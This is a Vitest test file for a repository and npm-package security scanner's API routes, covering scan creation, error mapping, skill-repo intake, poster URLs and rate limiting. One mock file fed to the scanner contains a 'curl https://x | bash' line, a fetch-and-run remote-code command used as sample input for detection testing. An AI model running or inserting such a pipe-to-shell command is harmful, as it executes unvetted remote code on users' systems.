import fs from "node:fs";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { POST as createScan } from "@/app/api/scan/route";
import { GET as getScan } from "@/app/api/scan/[id]/route";
import { GET as getPoster } from "@/app/api/scan/[id]/poster/route";
import { __resetScanRuntimeDepsForTest, __setScanRuntimeDepsForTest } from "@/lib/store";
import { RepoFetchError } from "@/lib/scan/github";
import { abuseGuard } from "@/lib/scan/abuse-guard";

describe("api routes", () => {
  beforeEach(() => {
    __setScanRuntimeDepsForTest({
      fetchRepoFiles: async () => ({
        files: [
          { path: "src/index.ts", content: "const x = 'ok';\n" },
          { path: "scripts/setup.sh", content: "curl https://x | bash\n" },
        ],
        workspaceDir: "/tmp/mock-scan",
        filesSkipped: 0,
        cleanup: async () => {},
      }),
      fetchNpmFiles: async () => ({
        files: [{ path: "src/index.ts", content: "export const value = 1;\n" }],
        workspaceDir: "/tmp/mock-npm-scan",
        filesSkipped: 0,
        packageName: "demo-pkg",
        packageVersion: "1.0.0",
        cleanup: async () => {},
      }),
      resolveSkillsAddGitHub: async () => null,
      runSemgrep: async () => ({
        findings: [
          {
            ruleId: "semgrep.rule",
            severity: "high",
            title: "Semgrep finding",
            file: "src/index.ts",
            line: 1,
            snippet: "const x = 'ok';",
            recommendation: "review",
          },
        ],
      }),
      runGitleaks: async () => ({
        findings: [
          {
            ruleId: "gitleaks.rule",
            severity: "critical",
            title: "Gitleaks finding",
            file: "src/secrets.ts",
            line: 3,
            snippet: "AKIA...",
            recommendation: "rotate",
          },
        ],
      }),
    });
  });

  afterEach(() => {
    __resetScanRuntimeDepsForTest();
    // 重置 abuse-guard 状态
    abuseGuard.resetInFlight();
    abuseGuard.clearIp('test-client-ip');
  });

  it("creates scan and reads report/poster", async () => {
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const created = await createScan(req as any);
    expect(created.status).toBe(200);
    const payload = (await created.json()) as { scanId: string };
    expect(payload.scanId.startsWith("scan_")).toBe(true);
    const reportPath = path.join(process.cwd(), "data", "reports", `${payload.scanId}.json`);
    expect(fs.existsSync(reportPath)).toBe(true);

    const reportResp = await getScan({} as any, { params: Promise.resolve({ id: payload.scanId }) });
    expect(reportResp.status).toBe(200);
    const report = (await reportResp.json()) as { id: string; engineVersion: string; findings: unknown[] };
    expect(report.id).toBe(payload.scanId);
    expect(report.engineVersion).toBe("v0.2.3");
    expect(report.findings.length).toBeGreaterThan(0);

    const posterResp = await getPoster(
      new Request("http://localhost/api/scan/x/poster") as any,
      { params: Promise.resolve({ id: payload.scanId }) },
    );
    expect(posterResp.status).toBe(200);
    const poster = (await posterResp.json()) as { id: string; qrUrl: string };
    expect(poster.id).toBe(payload.scanId);
    expect(poster.qrUrl.includes(`/scan/report/${payload.scanId}`)).toBe(true);
  });

  it("rejects invalid repo url", async () => {
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "invalid" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(400);
  });

  it("maps repository failures to typed error response", async () => {
    __setScanRuntimeDepsForTest({
      fetchRepoFiles: async () => {
        throw new RepoFetchError("repo_not_found", "repo not found");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/private-repo" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(404);
    const payload = (await res.json()) as { error: string };
    expect(payload.error).toBe("repo_not_found");
  });

  it("accepts npm command input and sets npm scan meta source", async () => {
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "npm i demo-pkg" }),
    });
    const created = await createScan(req as any);
    expect(created.status).toBe(200);
    const payload = (await created.json()) as { scanId: string };

    const reportResp = await getScan({} as any, { params: Promise.resolve({ id: payload.scanId }) });
    expect(reportResp.status).toBe(200);
    const report = (await reportResp.json()) as { scanMeta?: { source?: string; packageName?: string } };
    expect(report.scanMeta?.source).toBe("npm_registry");
    expect(report.scanMeta?.packageName).toBe("demo-pkg");
  });

  it("maps npm limit failures to 413", async () => {
    __setScanRuntimeDepsForTest({
      fetchNpmFiles: async () => {
        throw new RepoFetchError("npm_extracted_file_too_large", "too large");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "npx demo-pkg" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(413);
    const payload = (await res.json()) as { error: string };
    expect(payload.error).toBe("npm_extracted_file_too_large");
  });

  it("maps npm package not found to 404", async () => {
    __setScanRuntimeDepsForTest({
      fetchNpmFiles: async () => {
        throw new RepoFetchError("npm_package_not_found", "missing");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "npm i missing-pkg" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(404);
    const payload = (await res.json()) as { error: string };
    expect(payload.error).toBe("npm_package_not_found");
  });

  it("routes npx skills add owner/repo to github intake with dynamic subpaths", async () => {
    let capturedRepoUrl: string | null = null;
    let capturedSubPaths: string[] | null = null;
    let capturedTimeoutMs: number | undefined;
    __setScanRuntimeDepsForTest({
      resolveSkillsAddGitHub: async () => ({
        repoUrl: "https://github.com/pytorch/pytorch",
        skillRoots: [".claude/skills"],
      }),
      fetchRepoFiles: async (repoUrl, options) => {
        capturedRepoUrl = repoUrl;
        capturedSubPaths = options?.subPaths || null;
        capturedTimeoutMs = options?.timeoutMs;
        return {
          files: [{ path: ".claude/skills/a/SKILL.md", content: "name: a\ndescription: b\n" }],
          workspaceDir: "/tmp/mock-github-scan",
          filesSkipped: 0,
          cleanup: async () => {},
        };
      },
      fetchNpmFiles: async () => {
        throw new Error("should not use npm intake for skills add repo target");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "npx skills add pytorch/pytorch" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(200);
    const payload = (await res.json()) as { scanId: string };

    expect(capturedRepoUrl).toBe("https://github.com/pytorch/pytorch");
    expect(capturedSubPaths).toEqual([".claude/skills"]);
    expect(capturedTimeoutMs).toBe(45000);

    const reportResp = await getScan({} as any, { params: Promise.resolve({ id: payload.scanId }) });
    const report = (await reportResp.json()) as { repoUrl: string; scanMeta?: { source?: string } };
    expect(report.repoUrl).toBe("https://github.com/pytorch/pytorch");
    expect(report.scanMeta?.source).toBe("github_api");
  });

  it("caps dynamic skill roots for skills add source", async () => {
    let capturedSubPaths: string[] | null = null;
    __setScanRuntimeDepsForTest({
      resolveSkillsAddGitHub: async () => ({
        repoUrl: "https://github.com/acme/huge-skill-repo",
        skillRoots: [
          "z/deep/path",
          "a",
          ...Array.from({ length: 30 }).map((_, i) => `skills/group-${i}/tool`),
        ],
      }),
      fetchRepoFiles: async (_repoUrl, options) => {
        capturedSubPaths = options?.subPaths || null;
        return {
          files: [{ path: "a/SKILL.md", content: "name: a\ndescription: b\n" }],
          workspaceDir: "/tmp/mock-github-scan",
          filesSkipped: 0,
          cleanup: async () => {},
        };
      },
      fetchNpmFiles: async () => {
        throw new Error("should not use npm intake for skills add repo target");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "npx skills add acme/huge-skill-repo" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(200);
    expect(capturedSubPaths).not.toBeNull();
    expect((capturedSubPaths || []).length).toBe(20);
    expect(capturedSubPaths?.[0]).toBe("a");
  });

  it("builds poster qrUrl from forwarded host headers", async () => {
    const createReq = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const created = await createScan(createReq as any);
    const payload = (await created.json()) as { scanId: string };

    const posterReq = new Request("http://localhost/api/scan/x/poster", {
      headers: {
        "x-forwarded-proto": "https",
        "x-forwarded-host": "skill-security-scan.vercel.app",
      },
    });
    const posterResp = await getPoster(posterReq as any, {
      params: Promise.resolve({ id: payload.scanId }),
    });
    expect(posterResp.status).toBe(200);
    const poster = (await posterResp.json()) as { qrUrl: string };
    expect(poster.qrUrl).toBe(`https://skill-security-scan.vercel.app/scan/report/${payload.scanId}`);
  });
});

// V0.2.3.5: Rate limiting and concurrency control tests
describe("V0.2.3.5 abuse control", () => {
  beforeEach(() => {
    __setScanRuntimeDepsForTest({
      fetchRepoFiles: async () => ({
        files: [{ path: "src/index.ts", content: "const x = 'ok';\n" }],
        workspaceDir: "/tmp/mock-scan",
        filesSkipped: 0,
        cleanup: async () => {},
      }),
      fetchNpmFiles: async () => ({
        files: [{ path: "src/index.ts", content: "export const value = 1;\n" }],
        workspaceDir: "/tmp/mock-npm-scan",
        filesSkipped: 0,
        packageName: "demo-pkg",
        packageVersion: "1.0.0",
        cleanup: async () => {},
      }),
      resolveSkillsAddGitHub: async () => null,
      runSemgrep: async () => ({ findings: [] }),
      runGitleaks: async () => ({ findings: [] }),
    });
    // 重置状态
    abuseGuard.resetInFlight();
    abuseGuard.clearIp('127.0.0.1');
    abuseGuard.clearIp('test-client-ip');
  });

  afterEach(() => {
    __resetScanRuntimeDepsForTest();
    abuseGuard.resetInFlight();
  });

  it("allows requests under rate limit threshold", async () => {
    // 默认阈值是 10 请求/60秒，发送 3 个请求应该通过
    for (let i = 0; i < 3; i++) {
      abuseGuard.clearIp('127.0.0.1'); // 清理以便每次都从新状态开始

      // 为每次循环创建新的 Request 对象
      const req = new Request("http://localhost/api/scan", {
        method: "POST",
        headers: { "content-type": "application/json", "x-forwarded-for": "127.0.0.1" },
        body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
      });

      const res = await createScan(req as any);
      expect(res.status).toBe(200);
    }
  });

  it("blocks requests over rate limit threshold", async () => {
    const ip = '192.168.99.99';

    // 快速发送大量请求以填满窗口
    for (let i = 0; i < 10; i++) {
      const req = new Request("http://localhost/api/scan", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-forwarded-for": ip,
        },
        body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
      });
      await createScan(req as any);
    }

    // 第 11 个请求应该被阻塞
    const blockedReq = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-forwarded-for": ip,
      },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const res = await createScan(blockedReq as any);
    expect(res.status).toBe(429);

    const payload = (await res.json()) as { error: string; message: string };
    expect(payload.error).toBe("rate_limited");
    expect(payload.message).toContain("rate limit");
  });

  it("blocks requests when concurrency cap is reached", async () => {
    // 重置并发计数
    abuseGuard.resetInFlight();

    // 手动获取所有可用槽（默认 4 个）
    const slots: boolean[] = [];
    for (let i = 0; i < 10; i++) {
      slots.push(abuseGuard.tryAcquireSlot());
    }

    // 应该只获取了 4 个槽
    expect(slots.filter(Boolean).length).toBe(4);

    // 尝试创建新扫描应该被阻塞
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(429);

    const payload = (await res.json()) as { error: string; message: string };
    expect(payload.error).toBe("rate_limited");
    expect(payload.message).toContain("concurrent");
  });

  it("releases in-flight count on successful scan", async () => {
    abuseGuard.resetInFlight();

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });

    const beforeCount = abuseGuard.getInFlightCount();

    await createScan(req as any);

    // 等待一小段时间确保 finally 执行
    await new Promise(resolve => setTimeout(resolve, 10));

    const afterCount = abuseGuard.getInFlightCount();

    // 计数应该被释放（回到原始值）
    expect(afterCount).toBeLessThanOrEqual(beforeCount);
  });

  it("returns typed 429 response for rate limiting", async () => {
    // 填满并发槽
    abuseGuard.resetInFlight();
    for (let i = 0; i < 4; i++) {
      abuseGuard.tryAcquireSlot();
    }

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const res = await createScan(req as any);

    expect(res.status).toBe(429);

    const payload = (await res.json()) as { error: string; message: string };
    expect(payload).toMatchObject({
      error: "rate_limited",
      message: expect.stringContaining("please retry later"),
    });
  });

  it("uses 'unknown' IP when headers are missing", async () => {
    abuseGuard.clearIp('unknown');

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      // 不设置 IP 相关的 header
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });

    // 请求应该成功（未知 IP 也应该被处理）
    const res = await createScan(req as any);
    expect(res.status).toBe(200);
  });

  it("counts invalid JSON requests in pre-parse rate limiting", async () => {
    const ip = '203.0.113.77';
    abuseGuard.clearIp(ip);

    // 先用无效 JSON 填满该 IP 的限流窗口
    for (let i = 0; i < 10; i++) {
      const invalidReq = new Request("http://localhost/api/scan", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-forwarded-for": ip,
        },
        body: "{invalid-json",
      });
      const res = await createScan(invalidReq as any);
      expect(res.status).toBe(400);
    }

    // 第 11 个请求即使是有效 JSON，也应被限流拦截
    const validReq = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-forwarded-for": ip,
      },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });

    const blocked = await createScan(validReq as any);
    expect(blocked.status).toBe(429);
    const payload = (await blocked.json()) as { error: string };
    expect(payload.error).toBe("rate_limited");
  });
});
